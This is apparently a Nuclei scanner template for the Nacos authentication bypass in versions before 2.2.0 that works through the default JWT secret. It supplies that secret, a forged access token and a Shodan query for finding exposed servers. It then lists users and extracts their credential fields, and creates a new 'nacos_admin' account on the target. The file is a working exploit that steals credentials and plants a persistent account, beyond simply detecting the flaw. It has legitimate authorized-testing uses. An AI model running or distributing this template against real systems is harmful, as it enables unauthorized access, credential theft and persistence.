id: nacos-authentication-bypass-add-user
info:
  author: Esonhugh-self-maintained
  description: 'The authentication function of Nacos is can be bypass through default
    JWT secret.

    SecertKey: SecretKey012345678901234567890123456789012345678901234567890123456789

    Need base64 encode

    '
  metadata:
    shodan-query: title:"Nacos"
    verified: 'true'
  name: Nacos < 2.2.0 - Authentication Bypass
  reference:
  - https://github.com/alibaba/nacos/issues/10060
  - https://avd.aliyun.com/detail?id=AVD-2023-1655789
  - https://nacos.io/zh-cn/docs/auth.html
  remediation: Change value of jwt secret in the configurations
  severity: critical
  tags: auth-bypass,nacos,misconfig,jwt
requests:
- extractors:
  - json:
    - .pageItems[]
    name: extracted-credentials
    part: body
    type: json
  matchers:
  - condition: and
    type: word
    words:
    - '"username":'
    - '"password":'
  - part: header
    type: word
    words:
    - application/json
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/nacos/v1/auth/users?pageNo=1&pageSize=10&accessToken={{token}}'
  - '{{BaseURL}}/v1/auth/users?pageNo=1&pageSize=10&accessToken={{token}}'
  stop-at-first-match: true
- body: username=nacos_admin&password={{randstr_2}}
  extractors:
  - json:
    - .message
    name: Create user nacos_admin/{{randstr_2}}
    part: body
    type: json
  headers:
    Content-Type: application/x-www-form-urlencoded
    accessToken: '{{token}}'
  matchers:
  - status:
    - 200
    type: status
  - condition: and
    type: word
    words:
    - '"code":'
    - '200'
    - '"data":'
    - '"create user ok!"'
  - part: header
    type: word
    words:
    - application/json
  matchers-condition: and
  method: POST
  path:
  - '{{BaseURL}}/nacos/v1/auth/users'
  - '{{BaseURL}}/v1/auth/users'
  stop-at-first-match: true
stop-at-first-match: true
variables:
  token: eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6OTk5OTk5OTk5OTl9.-isk56R8NfioHVYmpj4oz92nUteNBCN3HRd0-Hfk76g
